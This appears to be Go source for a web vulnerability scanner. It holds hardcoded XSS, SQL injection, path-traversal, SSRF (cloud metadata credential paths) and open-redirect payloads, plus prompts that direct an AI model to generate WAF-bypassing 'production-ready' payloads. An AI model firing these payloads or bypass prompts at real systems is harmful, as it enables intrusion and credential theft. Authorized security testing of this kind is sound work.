package exploit

import (
	"context"
	"fmt"
	"strings"
)

// BypassHistory tracks what filters were encountered
type BypassHistory struct {
	Payloads       []string
	BlockedReasons []string
	SuccessfulTechniques []string
}

// GetHardcodedPayloads returns the 7 hardcoded payloads instantly (no AI generation)
func (s *Scanner) GetHardcodedPayloads(vulnType VulnerabilityType) []string {
	return s.getAdvancedPayloads(vulnType)
}

// GenerateNextAIPayload generates ONE AI payload based on previous test results (adaptive learning)
func (s *Scanner) GenerateNextAIPayload(ctx context.Context, vulnType VulnerabilityType, targetURL string, history *BypassHistory, iteration int, progressChan chan<- string) (string, error) {
	if s.aiModel == "" {
		// If AI is disabled, return empty (caller should stop generating)
		return "", fmt.Errorf("AI not enabled")
	}

	vulnTypeName := string(vulnType)
	sendProgressUpdate(progressChan, "generating", vulnTypeName, fmt.Sprintf("Generating AI bypass %d/3", iteration-7), 7+iteration, 10)

	payload, err := s.generateBypassPayload(ctx, vulnType, GetBaseTemplate(vulnType), targetURL, history, iteration-7)
	if err != nil || payload == "" {
		return "", err
	}

	return payload, nil
}

// GenerateAdaptivePayloads creates payloads: 7 hardcoded advanced + 3 AI bypass variants
// This balances speed and effectiveness while minimizing RAM usage
func (s *Scanner) GenerateAdaptivePayloads(ctx context.Context, vulnType VulnerabilityType, targetURL string, progressChan chan<- string) []string {
	payloads := make([]string, 0, 10)

	// First 7 payloads: Advanced hardcoded payloads
	hardcodedPayloads := s.getAdvancedPayloads(vulnType)
	payloads = append(payloads, hardcodedPayloads...)

	// Generate 3 AI bypass variants if AI is enabled
	if s.aiModel != "" {
		vulnTypeName := string(vulnType)
		aiCount := 3

		history := &BypassHistory{
			Payloads:             hardcodedPayloads, // AI learns from the hardcoded ones
			BlockedReasons:       []string{},
			SuccessfulTechniques: []string{},
		}

		// Generate AI payloads sequentially (one by one)
		// This allows testing hardcoded payloads immediately while AI generates in background
		for i := 1; i <= aiCount; i++ {
			// Send progress update
			sendProgressUpdate(progressChan, "generating", vulnTypeName, fmt.Sprintf("Generating AI bypass %d/%d", i, aiCount), 7+i, 10)

			// Generate AI bypass variant
			payload, err := s.generateBypassPayload(ctx, vulnType, GetBaseTemplate(vulnType), targetURL, history, i)

			if err != nil || payload == "" {
				// Skip if AI fails
				continue
			}

			payloads = append(payloads, payload)
			history.Payloads = append(history.Payloads, payload)
		}
	}

	return payloads
}

// generateFirstPayload creates the first enhanced payload
func (s *Scanner) generateFirstPayload(ctx context.Context, vulnType VulnerabilityType, baseTemplate, targetURL string) (string, error) {
	if s.aiModel == "" {
		return s.getFallbackPayload(vulnType, 1), nil
	}

	prompt := fmt.Sprintf(`You are an expert penetration tester. Create ONE advanced %s payload based on this template:
Template: %s
Target: %s

Requirements:
- Make it production-ready and likely to work
- Use modern techniques (encoding, obfuscation, polyglots)
- Keep it relatively simple but effective

Return ONLY the payload, no explanations.`, vulnType, baseTemplate, targetURL)

	response, err := s.callAI(ctx, prompt)
	if err != nil {
		return "", err
	}

	return strings.TrimSpace(response), nil
}

// generateBypassPayload creates a payload that learns from previous blocks
func (s *Scanner) generateBypassPayload(ctx context.Context, vulnType VulnerabilityType, baseTemplate, targetURL string, history *BypassHistory, iteration int) (string, error) {
	if s.aiModel == "" {
		return s.getFallbackPayload(vulnType, iteration), nil
	}

	// Build context from previous attempts
	previousAttempts := ""
	if len(history.Payloads) > 0 {
		previousAttempts = fmt.Sprintf("\nPrevious payloads that were tested:\n%s", strings.Join(history.Payloads, "\n"))
	}

	bypassTechniques := s.getBypassTechniques(vulnType, iteration)

	prompt := fmt.Sprintf(`You are an expert penetration testing specialist. Generate payload #%d for %s exploitation.

Base template: %s
Target: %s
%s

This is attempt #%d. Use these bypass techniques:
%s

Requirements:
- Each payload must be DIFFERENT from previous ones
- Bypass ALL security layers:
  * WAFs (Cloudflare, ModSecurity, AWS WAF, Akamai)
  * Input sanitization (strip_tags, htmlspecialchars, etc.)
  * Regex filters and blacklists
  * Encoding detection (base64, URL encode, etc.)
  * Length limits and character restrictions
  * Context-specific filters (HTML, JavaScript, SQL contexts)
- Use creative encoding, obfuscation, polyglots, and mutation
- Make it production-ready and likely to work in real environments
- Return ONLY the payload, no explanations

Generate ONE advanced bypass payload now:`, iteration, vulnType, baseTemplate, targetURL, previousAttempts, iteration, bypassTechniques)

	response, err := s.callAI(ctx, prompt)
	if err != nil {
		return "", err
	}

	return strings.TrimSpace(response), nil
}

// getBypassTechniques returns specific bypass techniques for each iteration
func (s *Scanner) getBypassTechniques(vulnType VulnerabilityType, iteration int) string {
	techniques := map[int]string{
		1: "Basic payload with minimal obfuscation",
		2: "Case variation (MiXeD CaSe)",
		3: "URL encoding (%20, %3C, %3E)",
		4: "Double encoding (%253C, %2520)",
		5: "Unicode escapes (\\u0061, \\x61)",
		6: "HTML entity encoding (&#x3C;, &lt;)",
		7: "Comment injection (/**/, <!---->)",
		8: "Whitespace manipulation (tabs, newlines, null bytes)",
		9: "Alternative protocols/tags (data:, javascript:, svg, details)",
		10: "Polyglot with multiple encoding layers",
	}

	if tech, exists := techniques[iteration]; exists {
		return tech
	}
	return "Advanced bypass technique"
}

// getAdvancedPayloads returns 7 advanced hardcoded payloads for each vulnerability type
func (s *Scanner) getAdvancedPayloads(vulnType VulnerabilityType) []string {
	advanced := map[VulnerabilityType][]string{
		VulnXSS: {
			// 1. Polyglot with multiple encoding
			`"><svg/onload=eval(atob('YWxlcnQoMSk='))>`,
			// 2. DOM-based with obfuscation
			`<details open ontoggle=alert\u0028 1\u0029>`,
			// 3. HTML entity + iframe srcdoc
			`<iframe srcdoc="&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;">`,
			// 4. Template literal bypass
			`"><svg/onload=alert` + "`1`" + `>`,
			// 5. Math annotation-xml polyglot
			`<math><mtext></mtext><annotation-xml encoding="text/html"><svg onload=alert(1)>`,
			// 6. IMG tag with onerror
			`<img src=x onerror=alert(1)>`,
			// 7. Case variation bypass
			`<ScRiPt>alert(1)</ScRiPt>`,
		},
		VulnSQLi: {
			// 1. Time-based blind (MySQL)
			`' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--`,
			// 2. Error-based extraction
			`' AND 1=CAST((SELECT version()) AS INT)--`,
			// 3. Union-based with table enumeration
			`' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--`,
			// 4. Boolean-based with subquery
			`' OR 1=1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--`,
			// 5. Concatenation-based extraction
			`'||(SELECT version())||'`,
			// 6. Classic OR bypass
			`' OR '1'='1`,
			// 7. Comment-based bypass
			`' OR 1=1--`,
		},
		VulnIDOR: {
			// 1. Negative ID
			`/api/users/-1`,
			// 2. Zero ID
			`/api/users/0`,
			// 3. Path traversal in ID
			`/api/users/%2e%2e%2fadmin`,
			// 4. UUID null/empty
			`/api/users/{00000000-0000-0000-0000-000000000000}`,
			// 5. Admin string
			`/api/users/admin`,
			// 6. Large number
			`/api/users/999999`,
			// 7. Sequential ID
			`/api/users/1337`,
		},
		VulnPathTraversal: {
			// 1. Double encoding
			`..%252f..%252fetc%252fpasswd`,
			// 2. UTF-8 encoding bypass
			`..%c0%af..%c0%afetc%c0%afpasswd`,
			// 3. Dot-dot-slash alternative
			`....//....//etc/passwd`,
			// 4. Mixed slash types
			`....\/....\/....\/ etc/passwd`,
			// 5. Absolute path
			`/etc/passwd`,
			// 6. Classic traversal
			`../../etc/passwd`,
			// 7. Windows path
			`..\..\..\..\windows\system32\drivers\etc\hosts`,
		},
		VulnSSRF: {
			// 1. AWS metadata (most common cloud SSRF target)
			`http://169.254.169.254/latest/meta-data/`,
			// 2. AWS metadata with bypass
			`http://169.254.169.254/latest/meta-data/iam/security-credentials/`,
			// 3. GCP metadata
			`http://metadata.google.internal/computeMetadata/v1/`,
			// 4. Azure metadata
			`http://169.254.169.254/metadata/instance?api-version=2021-02-01`,
			// 5. Localhost with protocol bypass
			`http://127.0.0.1`,
			// 6. Localhost DNS rebinding bypass
			`http://localhost.localdomain`,
			// 7. Internal network probe
			`http://192.168.1.1`,
		},
		VulnOpenRedirect: {
			// 1. Protocol-relative with @
			`//google.com@evil.com`,
			// 2. JavaScript protocol polyglot
			`javascript:alert(1)//https://google.com`,
			// 3. Triple slash
			`///evil.com`,
			// 4. Backslash bypass
			`/\evil.com`,
			// 5. Tab character bypass
			`/%09/evil.com`,
			// 6. Double slash
			`//evil.com`,
			// 7. HTTPS redirect
			`https://evil.com`,
		},
	}

	if payloads, exists := advanced[vulnType]; exists {
		return payloads
	}

	// Fallback to base template repeated 7 times
	base := GetBaseTemplate(vulnType)
	return []string{base, base, base, base, base, base, base}
}

// getFallbackPayload returns hardcoded fallback payloads when AI is unavailable
func (s *Scanner) getFallbackPayload(vulnType VulnerabilityType, iteration int) string {
	fallbacks := map[VulnerabilityType][]string{
		VulnXSS: {
			`<script>alert(1)</script>`,
			`<ScRiPt>alert(1)</sCrIpT>`,
			`<svg/onload=alert(1)>`,
			`<img src=x onerror=alert(1)>`,
			`%3Cscript%3Ealert(1)%3C%2Fscript%3E`,
			`<svg/onload=eval(atob('YWxlcnQoMSk='))>`,
			`<details open ontoggle=alert\u0028 1\u0029>`,
			`<iframe srcdoc="&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;">`,
			`"><svg/onload=alert`+"`1`"+`>`,
			`<math><mtext></mtext><annotation-xml encoding="text/html"><svg onload=alert(1)>`,
		},
		VulnSQLi: {
			`' OR '1'='1`,
			`' OR 1=1--`,
			`' UNION SELECT NULL,version()--`,
			`' AND SLEEP(5)--`,
			`' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--`,
			`'; WAITFOR DELAY '0:0:5'--`,
			`' AND 1=CAST((SELECT version()) AS INT)--`,
			`'||(SELECT version())||'`,
			`' OR 1=1 AND (SELECT COUNT(*) FROM information_schema.tables)>0--`,
			`' UNION SELECT NULL,NULL,NULL,table_name FROM information_schema.tables--`,
		},
		VulnIDOR: {
			`/api/users/1`,
			`/api/users/1337`,
			`/api/users/00000001`,
			`/api/users/-1`,
			`/api/users/0`,
			`/api/users/%2e%2e%2fadmin`,
			`/api/users/{00000000-0000-0000-0000-000000000000}`,
			`/api/users/../admin`,
			`/api/users/999999`,
			`/api/users/admin`,
		},
		VulnPathTraversal: {
			`../../etc/passwd`,
			`....//....//etc/passwd`,
			`..\..\..\..\windows\system32\drivers\etc\hosts`,
			`%2e%2e%2f%2e%2e%2fetc%2fpasswd`,
			`/var/www/../../etc/passwd`,
			`....\/....\/....\/etc/passwd`,
			`..%252f..%252fetc%252fpasswd`,
			`..%c0%af..%c0%afetc%c0%afpasswd`,
			`/etc/passwd`,
			`\..\..\..\..\etc\passwd`,
		},
		VulnSSRF: {
			`http://localhost`,
			`http://169.254.169.254/latest/meta-data/`,
			`http://metadata.google.internal/computeMetadata/v1/`,
			`http://127.0.0.1:22`,
			`http://0.0.0.0`,
			`http://[::1]`,
			`gopher://localhost:6379/_`,
			`file:///etc/passwd`,
			`http://127.1`,
			`http://localhost@attacker.com`,
		},
		VulnOpenRedirect: {
			`//evil.com`,
			`https://evil.com`,
			`/\evil.com`,
			`//google.com@evil.com`,
			`javascript:alert(1)//https://google.com`,
			`/\/\/evil.com`,
			`/%09/evil.com`,
			`/evil.com/%2f..`,
			`///evil.com`,
			`////evil.com`,
		},
	}

	if payloads, exists := fallbacks[vulnType]; exists {
		if iteration <= len(payloads) {
			return payloads[iteration-1]
		}
		return payloads[len(payloads)-1] // Return last if iteration exceeds
	}

	return GetBaseTemplate(vulnType)
}
